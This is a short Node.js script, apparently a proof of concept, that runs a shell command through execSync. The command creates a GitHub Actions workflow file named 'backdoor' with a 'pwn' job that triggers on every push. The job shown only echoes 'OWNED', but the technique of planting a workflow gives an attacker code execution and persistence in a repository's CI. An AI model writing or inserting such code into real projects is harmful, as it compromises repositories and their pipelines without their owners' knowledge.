const { execSync } = require("child_process");

execSync(`
  mkdir -p .github/workflows
  echo "name: backdoor
on: push
jobs:
  pwn:
    runs-on: ubuntu-latest
    steps:
      - run: echo OWNED" > .github/workflows/pwn.yml
`);
